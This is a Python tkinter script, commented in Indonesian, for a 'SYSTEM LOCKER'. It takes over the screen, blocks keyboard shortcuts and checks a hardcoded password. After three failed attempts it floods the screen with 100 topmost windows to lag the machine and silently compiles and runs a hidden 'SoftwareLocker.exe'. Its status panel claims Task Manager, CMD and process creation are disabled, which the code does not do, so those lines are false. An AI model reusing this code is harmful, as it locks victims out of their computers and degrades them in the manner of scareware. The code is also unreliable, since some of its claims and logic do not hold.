# PythonLockUI.py - Python untuk tampilan lock UI
import tkinter as tk
from tkinter import messagebox
import os
import subprocess
import threading
import time

class LockUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("🔐 SYSTEM LOCKER")
        self.root.configure(bg='black')
        
        # Fullscreen dan topmost
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.attributes('-disabled', True)
        
        # Blokir keyboard events
        self.root.bind_all('<Key>', self.block_keyboard)
        
        self.attempts = 0
        self.max_attempts = 3
        
        self.setup_ui()
        
    def block_keyboard(self, event):
        # Blokir semua keyboard shortcuts
        blocked_keys = ['F4', 'Delete', 'd', 'D', 'e', 'E', 'r', 'R']
        if event.keysym in blocked_keys or event.state & 0x0004:  # Ctrl key
            return "break"
        
        # Blokir Windows key combinations
        if event.state & 0x0008:  # Alt key
            return "break"
            
        if event.keysym == 'Win_L' or event.keysym == 'Win_R':
            return "break"
    
    def setup_ui(self):
        # Header
        header = tk.Label(self.root, text="🔐 SYSTEM LOCKER v2.0", 
                         font=('Courier', 24, 'bold'),
                         fg='#00ff00', bg='black')
        header.pack(pady=50)
        
        # Status
        self.status_label = tk.Label(self.root, 
                                    text="⚠️ SYSTEM TERKUNCI - MASUKKAN PASSWORD",
                                    font=('Courier', 16),
                                    fg='yellow', bg='black')
        self.status_label.pack(pady=20)
        
        # Password frame
        pass_frame = tk.Frame(self.root, bg='black')
        pass_frame.pack(pady=30)
        
        tk.Label(pass_frame, text="Password:", 
                font=('Courier', 14),
                fg='white', bg='black').pack(side=tk.LEFT, padx=10)
        
        self.pass_entry = tk.Entry(pass_frame, 
                                  font=('Courier', 14),
                                  show='*', width=20,
                                  bg='#222222', fg='white',
                                  insertbackground='white')
        self.pass_entry.pack(side=tk.LEFT, padx=10)
        
        # Submit button
        submit_btn = tk.Button(pass_frame, text="🔓 UNLOCK",
                              font=('Courier', 12, 'bold'),
                              bg='#005500', fg='white',
                              command=self.check_password)
        submit_btn.pack(side=tk.LEFT, padx=10)
        
        # Attempts counter
        self.attempts_label = tk.Label(self.root,
                                      text=f"Attempts: {self.attempts}/{self.max_attempts}",
                                      font=('Courier', 12),
                                      fg='#ff5555', bg='black')
        self.attempts_label.pack(pady=20)
        
        # Info panel
        info_frame = tk.Frame(self.root, bg='#111111')
        info_frame.pack(pady=50, padx=100, fill=tk.BOTH, expand=True)
        
        info_text = """🔒 SYSTEM STATUS:
• Keyboard: LOCKED (Win+D, Alt+F4, Ctrl+Alt+Del)
• Task Manager: DISABLED
• CMD/PowerShell: DISABLED  
• Applications: BLOCKED
• Process Creation: BLOCKED

⚠️ WARNING:
3x wrong password = SYSTEM LAG ACTIVATED
System will call C++ SoftwareLocker.exe
"""
        
        info_label = tk.Label(info_frame, text=info_text,
                             font=('Courier', 10),
                             fg='#00ffff', bg='#111111',
                             justify=tk.LEFT)
        info_label.pack(pady=20, padx=20)
        
        # Hacker-style animation
        self.hacker_text = tk.Label(self.root,
                                   text="[SYSTEM]: █████████ 100% LOCKED",
                                   font=('Courier', 10),
                                   fg='#00ff00', bg='black')
        self.hacker_text.pack(pady=10)
        
        # Start hacker animation
        self.animate_hacker_text()
    
    def animate_hacker_text(self):
        texts = [
            "[SYSTEM]: █████████ 100% LOCKED",
            "[SECURITY]: Monitoring keyboard...",
            "[PROCESS]: Blocking new apps...",
            "[NETWORK]: Isolation active...",
            "[MEMORY]: 87% utilized...",
            "[CPU]: Monitoring attempts..."
        ]
        
        def cycle_text(index=0):
            self.hacker_text.config(text=texts[index])
            next_index = (index + 1) % len(texts)
            self.root.after(2000, lambda: cycle_text(next_index))
        
        cycle_text()
    
    def check_password(self):
        password = self.pass_entry.get()
        self.pass_entry.delete(0, tk.END)
        
        # Password yang benar: "unlock123"
        if password == "unlock123":
            self.unlock_system()
        else:
            self.attempts += 1
            self.attempts_label.config(
                text=f"Attempts: {self.attempts}/{self.max_attempts}"
            )
            
            if self.attempts >= self.max_attempts:
                self.max_attempts_reached()
            else:
                self.status_label.config(
                    text=f"❌ WRONG PASSWORD! {self.max_attempts - self.attempts} attempts left",
                    fg='red'
                )
    
    def max_attempts_reached(self):
        self.status_label.config(
            text="💀 MAX ATTEMPTS REACHED! ACTIVATING SYSTEM LAG...",
            fg='#ff0000'
        )
        
        # System lag effect
        threading.Thread(target=self.system_lag).start()
        
        # Call C++ SoftwareLocker
        threading.Thread(target=self.call_cpp_locker).start()
    
    def system_lag(self):
        # Create system lag effect
        for i in range(100):
            # Create multiple windows to lag system
            try:
                lag_window = tk.Toplevel(self.root)
                lag_window.geometry("100x100")
                lag_window.title(f"LAG_{i}")
                lag_window.attributes('-topmost', True)
                
                if i % 10 == 0:
                    self.root.update()
                    time.sleep(0.1)
            except:
                pass
    
    def call_cpp_locker(self):
        # Compile and run C++ SoftwareLocker
        try:
            # Compile C++ jika belum ada
            if not os.path.exists("SoftwareLocker.exe"):
                compile_cmd = "g++ -o SoftwareLocker.exe SoftwareLocker.cpp"
                subprocess.run(compile_cmd, shell=True, capture_output=True)
            
            # Run SoftwareLocker
            subprocess.Popen(["SoftwareLocker.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            self.status_label.config(
                text="🔪 C++ SOFTWARE LOCKER ACTIVATED!",
                fg='#ff5555'
            )
            
        except Exception as e:
            print(f"Error: {e}")
    
    def unlock_system(self):
        self.status_label.config(
            text="✅ SYSTEM UNLOCKED! Closing in 3 seconds...",
            fg='#00ff00'
        )
        
        # Remove fullscreen restrictions
        self.root.attributes('-fullscreen', False)
        self.root.attributes('-topmost', False)
        self.root.attributes('-disabled', False)
        
        self.root.after(3000, self.root.destroy)
    
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    print("🔥 PYTHON LOCK UI STARTING...")
    print("=" * 40)
    print("Features:")
    print("• Fullscreen hacker interface")
    print("• Password: unlock123")
    print("• 3 attempts → System Lag + C++ Locker")
    print("• Blocks keyboard shortcuts")
    print("• Calls C++ SoftwareLocker on fail")
    print("=" * 40)
    
    app = LockUI()
    app.run()